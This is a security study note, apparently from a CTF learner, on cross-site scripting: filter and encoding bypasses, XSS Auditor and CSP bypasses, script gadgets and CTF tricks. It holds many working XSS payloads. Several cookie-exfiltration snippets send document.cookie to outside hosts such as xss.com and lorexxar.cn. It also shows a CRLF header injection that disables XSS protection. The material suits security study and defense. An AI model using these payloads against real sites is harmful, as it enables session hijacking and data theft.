# Cross-Site Scripting  
1. reflected xss  
2. stored xss  
3. DOM xss: 最近の流行り  
The most difference between DOM XSS and the other two ones is not necessity of sending data to server. This also brings an advantage such as hackers don't need to bypass waf! DOM XSS completely runs on the client side browser.  

Here are three kinds of common sinks:  
1. document sink  
```js
// get_var = <img src=x onerror=alert(1)>
document.getElementById('id').innerHTML = get_var;
```  
It is important that `<script>alert(1)</script>` doesn't work here because the operation is just a DOM injection.  

2. location sink  
```js
// url = javascript:alert(1)
document.location = url;
```  

3. execution sink  
e.g. `eval`, `setInterval`, `setTimeout`  

*  [Bypass tricks](#bypass-tricks)  
*  [XSS-Auditor Introduction and bypass](#xss-auditor-intro-and-bypass)  
*  [CSP Introduction and bypass](#csp-intro-and-bypass)  
*  [Some tricks played in CTF](#some-tricks-played-in-ctf)  
*  [Cheatsheet](#cheatsheet)    
*  [An interesting feature related to Transfer-Encoding](#an-interesting-feature-related-to-transfer-encoding)  
*  [Reference](#reference)

# Bypass tricks
* toUpperCase()  
```js
İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%c5%bf) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k
```  
* encode (parse the dangerous char  
  * url encode: `% + ASCII(hex) %3Cscript%3E`  
  * http://www.jsfuck.com/  
  js func: `escape()/unescape()`, `encodeURL()/decodeURL()`, `encodeURLComponent()/decodeURLComponent()`  
  * html encode
  ```php
  htmlspecialchars($_GET['hi']);  // no open html tag for you
  ```  
  * unicode encode: %u + ASCII(hex) ASP,IIS will automatically parse unicode. `<%s%cr%u0131pt>`  
  * `IBM037`,`IBM500`,`IBM1026`,`cp875` [Bypass RequestValidation on aspx]  
  * ascii encode
  ```js
  eval(String.fromCharCode(97,108,101,114,116,40,49,41))
  // <script>alert(1)</script>
  ```
  [Encode_tool](http://monyer.com/demo/monyerjs/)  
  String.fromCharCode() converts unicode to string [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
  eval() run the js script [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
* length limit  
  import js from outside  
* Byass with line feed`\n`  
```js
<img src="javas
cript:
alert(/1/);">
```  
* URL bypass `.`, `//`  
  urlencode, dec  
  `\\` bypass `http://`  
  Sup: the first `/` is used to separate schema and path, the second `/` is part of path  
  Even not need for `http`: `href="//www.google.com/"`  
* htmlspecialchars bypass  
  php nature function, can convert `&`,`'`,`"`,`<`,`>` five kinds of char to string. It won't filter out the single quote if it doesn't   have the second parameter(`ENT_QUOTES`).  
* bypass with ANSI charset (e.g. GBK, BIG5)  
  to fight against `magic_quotes_gpc = on` or `addslashes`  
  `1%81\" onclick=alert(1)/>`, `\` is 0x5C, 0x81 and 0x5C compose to a legal character in charset of GBK, so `"` wouldn't be escaped.  
* bypass with comments for different filter(comments have priority in HTML)  
  * Every filter needs HTML parser. Some HTML parsers could identify comments and ignore the data in comments.  
  ```js
  <!--ignored<!--ignored--><script>alert(1)</script>-->
  // <script>alert(1)</script> is exposed and run
  ```  
  * Some HTML parsers not care about the comments
  ```js
  <!--<a href="--><img src=x onerror=alert(1)//">hi</a>
  // HTML parsers consider as <a href="--><img src=x onerror=alert(1)//">hi</a> 
  ```  
  But, in fact, `<img src=x onerror=alert(1)>` is exposed.  
* different attribute  
```
// type
<input type="image" src=x onerror=alert(1)>
```  
* With json callback  
  Many servers provide with data API which user can define callback function by themselves, e.g. `callback([{'id': 1}])`  
  If the callback functions are not filtered appropriately, user can use `<script>alert(1)</script>([{}])` to complete xss attack  

[PHP filter functions](https://blog.csdn.net/h1023417614/article/details/29560985)  

# XSS Auditor Intro and bypass
XSS Auditor is specific defense toward **Reflected XSS** on Chrome. -- [XSS Auditor](https://www.chromium.org/developers/design-documents/xss-auditor)  
Here I will talk about the XSS filter in three browsers：  
1. IE XSS filter: replace dangerous character in request or response with regex  
2. Chrome XSS Auditor: check dangerous character in requst or response,**filter it only when it dangerous after putting into the page**.  
3. Firefox Noscript: Only check the dangerous character in request
```
// disable
X-XSS-Protection: 0

// Only filter the dangerous part
X-XSS-Protection: 1

// block the response and redirect to about:blank
X-XSS-Protection: 1; mode=block

// redirect report to the place you want
X-XSS-Protection: 1; mode=block; report=https://example.com/log.cgi
X-XSS-Protection: 1; report="https://example.com/log.cgi?jsessionid=132;abc"
```  

Bypass with CRLF in header injection:  
```
%0d%0aX-XSS-Protection:%200
```  

Auditor reference:  
* Source code  
[xss_auditor.h](https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/html/parser/xss_auditor.h)  
[xss_auditor_delegate.h](https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/html/parser/xss_auditor_delegate.h)

# CSP Intro and bypass
Defense from browser side -- [Content Security Policy Level 3](https://www.w3.org/TR/CSP/)  
With two ways 1. limit `js` to execute 2. limit request to other domains  
How to see whether there is a CSP working on the website？  
```php
curl -I https://github.com/
// list header
// From results, we can see that github already open the option of XSS-Protection
// also can see the details of CSP
Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; connect-src 'self' uploads.github.com status.github.com collector.githubapp.com api.github.com www.google-analytics.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com wss://live.github.com; font-src assets-cdn.github.com; form-action 'self' github.com gist.github.com; frame-ancestors 'none'; frame-src render.githubusercontent.com; img-src 'self' data: assets-cdn.github.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com *.githubusercontent.com; manifest-src 'self'; media-src 'none'; script-src assets-cdn.github.com; style-src 'unsafe-inline' assets-cdn.github.com
```
Now we focus on the CSP  
```php
header("Content-Security-Policy: default-src 'self '; script-src * ");
```
The CSP above welcome you to load js from any domain :-1: , and stop from loading any source from other domains
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
```
The CSP above only let you load the js from same domain, such as `src=upload/1pwnch.js`
```php
header(" Content-Security-Policy: default-src 'self '; script-src http://localhost/static/ ");
Content-Security-Policy: script-src 'self' trusted.domain.com
```
First CSP: we can only load js from static path. In this case, we can find any redirect file under the path of `static/`, control it and redirect to the js file we want.  
Second CSP: We can find controllable script from trusted.domain.com, or any **jsonp** to exploit it, for example：  
```php
<script src="trusted.domain.com/jsonp?callback=alert(1)//"></script>
```
In addition to jsonp, `Angularjs` also can be used to bypass the CSP with `{{}}` instead of `eval`.  
Let's take a look at more CSP  
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
```
`unsafe-inline` means the added `<script>` in the page can execute, then we can bypass the limit of domain with following ways：  
  1. make link prefetch with js  
     [what's prefetch](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Link_prefetching_FAQ)  
     prefetch: `DNS-prefetch`,`subresource`,`prefetch`,`preconnect`,`prerender`  
     Not all source can be preloaded, e.g. ajax, open your page of developer tool    
     ```js
     // can only be used by chrome  
     var x = document.createElement("link");
     x.setAttribute("rel", "prefetch");
     x.setAttribute("href", "//xxxxx.com/?" + document.cookie);
     document.head.appendChild(x);
     ```
  2. redirect && cross domain  
     Be careful redirect is also limited by host header, but `src` can escape the limit  
     ```js
     <script>location.href='http://lorexxar.cn?a+document.cookie'</script>
     <script>windows.open('http://lorexxar.cn?a=+document.cooke')</script>
     <meta http-equiv="refresh" content="5;http://lorexxar.cn?c=[cookie]">
     //
     var x = document.createElement("x");
     x.href='http://xss.com/?cookie='+escape(document.cookie);
     x.click();
     ```  
* nonce script CSP  
  Website would identify script to executable or note with a random token  
  ```php
  header("Content-Security-Policy: default-src 'self'; script-src 'nonce-{random}' ");
  ```
  Only script like `<script nonce="{random}">alert(1)</script>` can run here.  
  But, bypass is also possible. In fact, the `nonce` is generated once a request.  
  ```php
  <script nonce="<?php echo $random ?>">
  ```  
  Just like **Sebastian Lekies** bypass with **DOM XSS** because DOM XSS only works in client side.   
  [How to bypass CSP nonces with DOM XSS 🎅](http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)  
  Sush as `location.hash`, which won't be sent to the backend, and nonce would not be refreshed!  
* strict-dynamic  
  Created in CSP3 for various kinds of templates.  
  ```js
  script-src 'nonce-random' 'strict-dynamic'; object-src 'none'
  // the source can be loaded
  <script src='test.com/a.js' nonce='random'></script>
  ```
  strict-dynamic helps developers to run all the **dynamically-added** script created by **already-trusted** script.  
  if `a.js` still wants to load other js, that could only for the script of **not parser-inserted** type  
  ```js
  <!-- a.js -->
  // the source can be loaded
  var script = document.createElement('script');
  script.src = 'test.com/dependency.js';
  document.body.appendChild(script);
  // the source cannot be loaded
  document.write("<scr"+"ipt src='test.com/dependency.js'></scr"+"ipt>");
  ```
  While `createElement`, element still not parser-inserted. But it becomes parser-inserted after using `documemt.write`.  

  :cat2:**Script Gadgets**：  
  [security-research-pocs by Google](https://github.com/google/security-research-pocs/tree/master/script-gadgets)  
  Script Gadget means existing js code to bypass xss mitigations  
  ```js
  // bypass with require.js
  Content-Security-Policy: "default-src='none';script-src 'nonce-random' 'strict-dynamic'"
  <script data-main="data:,alert(1)"></script>
  <script nonce="random" src="require.js"></script>
  // Reason：require.js will find the script with attribute of data-main and load it like following
  var node = document.createElement('script');
  node.src = 'data:,alert(1)';
  document.head.appendChild(node);
  ```  
  Just like mentioned above, it is not parser-inserted.  

  :cat2:**CVE-2018-5175** (Bypass strict-dynamic with add-on)：  
  [Browser Extensions
](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions)  
  legacy-extension就是那些過去以XUL/XPCOM為基礎所建造的擴充，雖然2017/11後基礎已改為Web-extensions，但瀏覽器內部至今還多使用這個機制  
  這裡我們必須了解`manifest`下的`web_accessible_resources`(webextension)以及`contentaccessible flag`(legacy extension)，被這個`url contentaccessible=yes`的resource可以從任何頁面載入，這裡就有個弊端了，**任何頁面載入並且不需要nonce允許**！  
  ```json
  ....
  resource devtools devtools/modules/devtools/
  resource devtools-client-jsonview resouce://devtools/client/jsonview/ contentaccessible=yes
  ....
  ```
  上面是firefox extension下`manifest`的一部分，可以知道`resource://devtools`下面的file都可以從任何頁面載入而不需要nonce的允許，而`resource://devtools/client/jsonview/lib/require.js`也不例外。  
  ```js
  <!-- exploit -->
  csp: strict-dynamic...

  <script data-main="data:,alert(1)"></script>
  <script src="resource://devtools-client-jsonview/lib/require.js"></script>
  ```
  所以我們不需要nonce也能讓`require.js`載入執行，靠script-gadget中提到`require.js`尋找`data-main`屬性，不難理解這個xss的攻擊就會成功bypass csp了！  

  若不是框架中帶有的script-gadget，就從開發者的code中自己找一個，以下為思路：  
  某段script中將`attribute`的值插入`innerHTML`;  

Some recommended tools：  
1. [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
2. [ChromePlugin-CSP Mitigator](https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa)  

以上筆記很大部分取自  
[LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
[CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)  
非常推薦閱讀原文  
[迅速查表CSP cheatsheet](http://dogewatch.github.io/2016/12/08/By-Pass-CSP/)

# Some tricks played in CTF  
Here are something what I learned in sites or CTF.  
* Exploit with various `<tag>`  
```js
// script
<script>a=prompt;a(1)</script>

// img
<img src=1 onmouseover=alert(1)>
<img src=1 onerror=confirm(1)>
<img src="javascript:alert(1);">

// svg
<svg/onload=alert(1)>

// body
<body/onload=javascript:window.onerror=eval;throw=alert\x281\x29’;>  
```
* DOM based XSS  
```js
<script>document.getElementById("contents").innerHTML=location.hash.substring(1);</script>
// the data after hash won't be sent to the server side
```
* bootstrap data-* 屬性  
```js
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<button data-toggle="collapse" data-target="<img src=x onerror=alert(0)>">Test</button>

// 關於這個漏洞的解釋issue中有一個評論很清楚
<button data-toggle="collapse" data-target="<?=htmlspecialchars($_GET['x']);?>">Test</button>
// 雖然有參數可控但是htmlspecialchar轉義，這本該是安全的，但是會在bootstrap環境下data-target的屬性中觸發
```
值得注意的是`data-target`本身不會造成xss漏洞，而是被帶到boostrap的環境下發揮效用的！  
[XSS in data-target attribute #20184](https://github.com/twbs/bootstrap/issues/20184)  
* `<base>` overwrites the js in relative path  
This is what I learned in RCTF-2018, CSP doesn't limit `base-uri` cause to `<base>` bypass, and there are also relative js imported from outside, now we can forge a js which is able to ignore the CSP rules.  
**Exploit**:  
:point_down: insert `<base href="http://controlled_domain/">`  
:point_down: imported `/assets/jquery.min.js` becomes `http://controlled_domain/assets/jquery.min.js`  
:point_down: `controlled_domain/assets/jquery.min.js` can be inserted with `location.href=url;`  
:point_down: when we visit the page inserted with `<base>`, we will be redirect to `url`!  
More details: [rblog-writeup](https://github.com/shinmao/CTF-writeups/tree/master/RCTF2018)  
* `<base target>` steal the content of pages(token)  
Also use the tag of `<base>` but the concept is different  
**Exploit**:  
:point_down: insert an uncompleted `<base target>` to the page  
:point_down: `target` makes all URL's page[http://evil.com/](http://evil.com/)in current page have a same `window.name`!  
:point_down: page of [http://evil.com/](http://evil.com/) has `<script>alert(name);</script>`  
:point_down: the content of pop block is the name of the target  
[reference](https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup)  

# Cheatsheet
[Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  
[PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  

# An interesting feature related to Transfer-Encoding
If POST request includeds header of `Transfer-Encoding: chunked`, the data stream would be responded to client without any changes. This causes to the malicious content such like XSS.(Has been patched in the lastest version)  
[XSS due to the header Transfer-Encoding: chunked](https://bugs.php.net/bug.php?id=76582)

# Reference
1. [烏雲](http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)  
2. [云淡风轻](http://blog.idhyt.com/2014/10/15/technic-xss-bypass/)  
3. [freebuf](http://www.freebuf.com/articles/web/153055.html)  
4. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)  
5. [LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
6. [通过严格的内容安全策略（CSP）重塑Web防御体系 by 安全客](https://www.anquanke.com/post/id/84655)  
7. [CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)  
